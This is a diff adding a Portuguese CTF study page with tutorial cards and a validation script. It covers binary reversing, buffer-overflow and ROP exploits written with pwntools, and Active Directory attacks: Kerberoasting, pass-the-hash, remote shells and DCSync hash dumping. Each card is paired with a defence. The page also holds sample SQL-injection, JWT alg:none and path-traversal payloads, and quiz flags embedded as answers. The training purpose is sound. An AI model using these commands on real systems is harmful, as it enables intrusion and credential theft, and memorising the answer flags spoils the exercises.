+<span class="k">checksec</span> ./desafio           <span class="c"># NX · Canary · PIE · RELRO</span>
+<span class="k">strings</span> ./desafio | grep -i flag
+<span class="c"># procurar: funções perigosas (gets, strcpy, scanf) e win (system, print_flag)</span></pre></div>
+        <div class="blk"><div class="h ver"><span class="d"></span>O que o checksec diz</div><pre># NX ligado  -> não roda shellcode na pilha, use ROP/ret2libc
+# Canary     -> precisa vazar o canário antes do overflow
+# PIE        -> endereços aleatórios, precisa de leak
+# Sem proteções -> ret2win direto</pre></div>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os lin">ESTÁTICA</span>Decompilar (Ghidra / radare2)</h3></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Para resolver um "reverse", você lê a lógica do binário. O Ghidra (decompilador gratuito da NSA) transforma assembly em pseudo-C legível; achar a função de verificação de senha costuma revelar a flag.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="k">ghidra</span>                      <span class="c"># importar binário -> decompilar função main</span>
+<span class="k">r2</span> -A ./desafio             <span class="c"># radare2: aaa, afl, pdf @ main</span>
+<span class="k">objdump</span> -d ./desafio        <span class="c"># disassembly rápido</span>
+<span class="k">ltrace</span> ./desafio            <span class="c"># chamadas de biblioteca (comparações de senha)</span></pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Técnica</span>Senha/flag hardcoded ou lógica de verificação revelada no decompilador.</div>
+          <div class="r safe"><span class="lab">🟢 Nota</span>Segredo em binário é sempre recuperável — nunca confie em ofuscação como proteção.</div>
+        </div></div>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os lin">PWN</span>Buffer overflow → ret2win</h3><div class="cat">o pwn mais clássico</div></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Quando um programa lê mais dados que o buffer comporta (ex.: <code class="inl">gets()</code>), você sobrescreve o <b>endereço de retorno</b> e redireciona a execução — para uma função "win" que imprime a flag, ou para uma shell.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="c"># 1) achar o offset até o retorno (padrão cíclico):</span>
+<span class="k">cyclic</span> 200   <span class="c"># gera · depois: cyclic -l &lt;valor_do_crash&gt;</span>
+<span class="c"># 2) exploit com pwntools:</span>
+python3 -c <span class="s">"
+from pwn import *
+elf = ELF('./desafio')
+p = process('./desafio')
+payload = b'A'*72 + p64(elf.symbols['win'])
+p.sendline(payload); p.interactive()"</span></pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Ataque</span>Overflow sobrescreve o retorno → chama <code>win()</code> → flag.</div>
+          <div class="r safe"><span class="lab">🟢 Defesa</span>Usar <code>fgets</code>/limites, compilar com canary+NX+PIE, evitar <code>gets/strcpy</code>.</div>
+        </div></div>
+        <button class="trainbtn" data-elab="e-pwn" type="button">🎮 Treinar (defesa)</button>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os lin">PWN</span>ROP / ret2libc (NX ligado)</h3></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Com NX ligado você não roda shellcode na pilha. A saída é <b>ROP</b> (Return-Oriented Programming): encadear "gadgets" (trechos que terminam em <code class="inl">ret</code>) já presentes no binário/libc para chamar <code class="inl">system("/bin/sh")</code>.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="k">ROPgadget</span> --binary ./desafio --only <span class="s">"pop|ret"</span>
+<span class="k">ropper</span> -f ./desafio --search <span class="s">"pop rdi"</span>
+<span class="c"># pwntools monta a cadeia automaticamente:</span>
+python3 -c <span class="s">"
+from pwn import *
+elf=ELF('./desafio'); rop=ROP(elf)
+rop.call('puts',[elf.got['puts']]); rop.call('main')
+print(rop.chain())"</span></pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Técnica</span>Vazar libc → montar ROP → <code>system('/bin/sh')</code> → shell/flag.</div>
+          <div class="r safe"><span class="lab">🟢 Defesa</span>Full RELRO, ASLR/PIE, canário e fortificação (<code>_FORTIFY_SOURCE</code>).</div>
+        </div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== WINDOWS & AD ===== -->
+  <div class="apanel" id="e-ad">
+    <div class="disc">🪟 <b>Windows &amp; Active Directory</b> — redes corporativas em CTF/pentest. O fluxo: enumerar o domínio → obter credenciais → escalar até Domain Admin. Ferramentas: Impacket, BloodHound, CrackMapExec, Rubeus, Evil-WinRM.</div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os win">AD</span>Enumeração do domínio (BloodHound)</h3></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Antes de atacar, mapeie o AD. O BloodHound coleta usuários, grupos, sessões e permissões e desenha o <b>caminho mais curto</b> até Domain Admin (ex.: abuso de ACL, delegação).</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="k">nmap</span> -p53,88,389,445,3268 alvo        <span class="c"># 88=Kerberos confirma AD</span>
+<span class="k">bloodhound-python</span> -u user -p senha -d ctf.local -ns &lt;DC-IP&gt; -c All
+<span class="k">crackmapexec</span> smb &lt;DC&gt; -u user -p senha --users   <span class="c"># enum usuários</span>
+<span class="k">enum4linux-ng</span> -A &lt;DC&gt;</pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Ataque</span>BloodHound revela caminho de ACL/delegação até DA.</div>
+          <div class="r safe"><span class="lab">🟢 Defesa</span>Revisar ACLs, remover delegação desnecessária, tiering de admins.</div>
+        </div></div>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os win">AD</span>Kerberoasting</h3><div class="cat">o ataque de AD mais recorrente</div></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Com qualquer credencial de domínio, você requisita tickets TGS de contas de serviço (SPN) e os quebra <b>offline</b>. Se a conta de serviço tiver senha fraca, você recupera a senha e escala.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="k">impacket-GetUserSPNs</span> ctf.local/user:senha -dc-ip &lt;DC&gt; -request
+<span class="c"># quebrar o ticket (modo 13100 = TGS):</span>
+<span class="k">hashcat</span> -m 13100 hashes.txt rockyou.txt
+<span class="c"># AS-REP Roasting (usuários sem pré-auth, modo 18200):</span>
+<span class="k">impacket-GetNPUsers</span> ctf.local/ -usersfile users.txt -no-pass</pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Ataque</span>TGS de conta de serviço com senha fraca → quebrado → escalonamento.</div>
+          <div class="r safe"><span class="lab">🟢 Defesa</span>Senhas longas/gMSA nas contas de serviço, exigir pré-autenticação Kerberos.</div>
+        </div></div>
+        <button class="trainbtn" data-elab="e-kerb" type="button">🎮 Treinar (defesa)</button>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3><span class="os win">AD</span>Movimento lateral &amp; domínio</h3></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>O que é / por que importa</div><p>Com credenciais/hash, você se move entre máquinas (pass-the-hash), executa comandos remotos e, no fim, faz <b>DCSync</b> para dumpar todos os hashes do domínio.</p></div>
+        <div class="blk"><div class="h faz"><span class="d"></span>Como fazer</div>
+<pre><span class="k">crackmapexec</span> smb &lt;rede&gt; -u user -H &lt;hash&gt;        <span class="c"># pass-the-hash</span>
+<span class="k">evil-winrm</span> -i &lt;alvo&gt; -u user -p senha            <span class="c"># shell remota</span>
+<span class="k">impacket-secretsdump</span> ctf.local/admin@&lt;DC&gt;        <span class="c"># DCSync (todos os hashes)</span></pre></div>
+        <div class="interp"><div class="rr">
+          <div class="r vuln"><span class="lab">🔴 Ataque</span>Pass-the-hash → DCSync → todos os hashes → Domain Admin + flags.</div>
+          <div class="r safe"><span class="lab">🟢 Defesa</span>LAPS, SMB signing, restringir admins locais, Credential Guard, detectar DCSync.</div>
+        </div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== PROVAS ===== -->
+  <div class="apanel" id="e-provas">
+    <div class="disc" style="border-color:var(--acc)">📝 <b>Arena de CTFs simulados.</b> Aplique a metodologia completa. As flags têm formato <code class="inl">flag{...}</code> — digite a flag encontrada para validar (sem colar: digite manualmente).</div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3>🧩 E1 — Jeopardy: decodifique a flag (Cripto)</h3><div class="cat">categoria: Criptografia · fácil</div></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>Desafio</div><p>Interceptamos esta string. Lembre do checklist: decode primeiro. Qual a flag?</p>
+<pre>ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259</pre>
+          <p style="color:var(--mut2);font-size:12.5px">Dica: termina com <code class="inl">=</code>? conte os caracteres… parece Base64. Use <code class="inl">echo "..." | base64 -d</code> ou CyberChef.</p></div>
+        <div class="eflag" data-flag="flag{base64_is_not_encryption}">
+          <input type="text" placeholder="digite a flag: flag{...}" autocapitalize="off" spellcheck="false">
+          <button type="button">Validar flag</button>
+          <span class="eres"></span>
+        </div>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3>🧩 E2 — Jeopardy: ROT13 (Cripto)</h3><div class="cat">categoria: Criptografia · fácil</div></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>Desafio</div><p>Esta mensagem passou por uma cifra de César de 13 posições. Decodifique.</p>
+<pre>synt{ebg13_vf_whfg_pnrfne}</pre>
+          <p style="color:var(--mut2);font-size:12.5px">Dica: <code class="inl">echo "..." | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code> ou CyberChef ROT13.</p></div>
+        <div class="eflag" data-flag="flag{rot13_is_just_caesar}">
+          <input type="text" placeholder="digite a flag: flag{...}" autocapitalize="off" spellcheck="false">
+          <button type="button">Validar flag</button>
+          <span class="eres"></span>
+        </div>
+      </div>
+    </div>
+
+    <div class="v"><div class="top"><div class="ttl"><h3>🧩 E3 — Jeopardy: hexadecimal (Encoding)</h3><div class="cat">categoria: Misc · fácil</div></div><div class="chev">›</div></div>
+      <div class="body">
+        <div class="blk"><div class="h what"><span class="d"></span>Desafio</div><p>Bytes em hexadecimal. Converta para texto.</p>
+<pre>666c61677b6865785f746f5f61736369697d</pre>
+          <p style="color:var(--mut2);font-size:12.5px">Dica: <code class="inl">echo "..." | xxd -r -p</code> ou CyberChef "From Hex".</p></div>
+        <div class="eflag" data-flag="flag{hex_to_ascii}">
+          <input type="text" placeholder="digite a flag: flag{...}" autocapitalize="off" spellcheck="false">
+          <button type="button">Validar flag</button>
+          <span class="eres"></span>
+        </div>
+      </div>
+    </div>
+
+    <div class="disc">🏁 <b>Próximo nível (prática real):</b> para Attack e Defence completos (enumeração → exploração → root), treine em máquinas reais: <b>PicoCTF</b> (gratuito, iniciante), <b>TryHackMe</b> (trilhas guiadas), <b>HackTheBox</b> (avançado), <b>Root-Me</b> e <b>OverTheWire</b>. Aplique a metodologia desta prova em cada máquina.</div>
+  </div>
 </div>
+</div>
+
 <div class="prova-content" id="provaF">
   <div class="provaempty"><div class="big">🅵</div><h2>Prova F</h2><p>Conteúdo em construção.</p><span class="tag">em breve</span></div>
 </div>
@@ -7800,6 +8299,64 @@ document.querySelectorAll('#provaA .jumpcard').forEach(function(j){
       e.preventDefault(); warn("🚫 Menu colar bloqueado — digite manualmente!");
     }
   }, true);
+})();
+</script>
+<script>
+/* ===== Prova E: abas, treinos e flags ===== */
+(function(){
+  // abas internas
+  document.querySelectorAll('#provaE .atab').forEach(function(t){
+    t.addEventListener('click',function(){
+      document.querySelectorAll('#provaE .atab').forEach(x=>x.classList.remove('active'));
+      document.querySelectorAll('#provaE .apanel').forEach(x=>x.classList.remove('active'));
+      t.classList.add('active');
+      var el=document.getElementById(t.dataset.ep); if(el) el.classList.add('active');
+    });
+  });
+
+  // cenários de treino (defesa de cada técnica ofensiva)
+  var ELABS={
+    "e-recon":{title:"Reduzir exposição (Recon)", cmd:"nmap -sV alvo", vuln:"21/tcp open  ftp  vsFTPd 2.3.4   (backdoor conhecido exposto)", fix:"atualizar o serviço, fechar a porta e aplicar firewall default-deny", safe:"porta 21 filtrada / vsFTPd atualizado — sem versão vulneravel exposta", key:["atualiz","update","firewall","fechar","porta"]},
+    "e-sqli":{title:"Defender SQL Injection", cmd:"login:  admin'-- -", vuln:"Bem-vindo, admin!  (login sem senha)", fix:"usar consultas parametrizadas (prepared statements) no codigo", safe:"Usuario ou senha invalidos", key:["prepared","pdo","parametriz","mysqli"]},
+    "e-jwt":{title:"Defender JWT", cmd:"token com header {\"alg\":\"none\"} e role=admin", vuln:"acesso de admin concedido (assinatura nao verificada)", fix:"rejeitar alg:none, fixar o algoritmo no servidor e validar a assinatura", safe:"401 - token rejeitado (assinatura invalida)", key:["none","algoritmo","fixar","assinatura","verif","hs256"]},
+    "e-lfi":{title:"Defender LFI / Traversal", cmd:"?file=../../../../etc/passwd", vuln:"root:x:0:0:root:/root:/bin/bash ...  (arquivo lido)", fix:"validar com basename()/realpath() e lista de permissoes", safe:"Arquivo nao permitido", key:["basename","realpath","allowlist","lista","valid"]},
+    "e-stego":{title:"Limpar metadados", cmd:"exiftool foto.jpg", vuln:"Comment: flag{metadado_exposto}  (segredo no metadado)", fix:"remover metadados antes de publicar: exiftool -all= foto.jpg", safe:"(sem comentarios/metadados sensiveis)", key:["exiftool","all=","limpar","metadad","remov"]},
+    "e-pwn":{title:"Defender Buffer Overflow", cmd:"entrada de 200 bytes em buffer de 64", vuln:"retorno sobrescrito -> win() executada -> flag vazada", fix:"usar fgets com limite, compilar com stack canary + NX + PIE", safe:"entrada truncada com seguranca - sem overflow", key:["fgets","canary","nx","limite","fortify","pie"]},
+    "e-kerb":{title:"Defender Kerberoasting", cmd:"GetUserSPNs + hashcat -m 13100", vuln:"senha da conta de servico quebrada offline -> escalonamento", fix:"usar gMSA ou senha longa e aleatoria nas contas de servico", safe:"ticket TGS nao quebra (senha forte / gMSA)", key:["gmsa","senha","pre","longa","aleat"]}
+  };
+  if(window.csOpenLab){
+    document.querySelectorAll('#provaE .trainbtn[data-elab]').forEach(function(b){
+      var s=ELABS[b.dataset.elab]; if(!s) return;
+      b.addEventListener('click',function(e){ e.stopPropagation(); window.csOpenLab(s, s.title, false); });
+    });
+  }
+
+  // validacao de flags (Jeopardy)
+  document.querySelectorAll('#provaE .eflag').forEach(function(w){
+    var inp=w.querySelector('input'), btn=w.querySelector('button'), res=w.querySelector('.eres');
+    var ans=(w.getAttribute('data-flag')||'').trim().toLowerCase();
+    function check(){
+      var v=(inp.value||'').trim().toLowerCase();
+      if(!v){ res.textContent=''; res.className='eres'; return; }
+      if(v===ans){ res.textContent='✅ Flag correta! Mandou bem.'; res.className='eres ok'; }
+      else { res.textContent='❌ Ainda não — revise o decode.'; res.className='eres no'; }
+    }
+    btn.addEventListener('click',check);
+    inp.addEventListener('keydown',function(e){ if(e.key==='Enter'){ e.preventDefault(); check(); } });
+  });
+
+  // concepts modal já é tratado pelo handler global #fund? Garantir os de #econcepts:
+  var modal=document.getElementById('cModal');
+  if(modal){
+    var t=document.getElementById('cmTitle'), b=document.getElementById('cmBody');
+    document.querySelectorAll('#econcepts .popc').forEach(function(c){
+      c.addEventListener('click',function(){
+        t.textContent=c.getAttribute('data-t')||'';
+        var gx=c.querySelector('.gx'); b.innerHTML=gx?gx.innerHTML:'';
+        modal.classList.add('show');
+      });
+    });
+  }
 })();
 </script>
 </body>
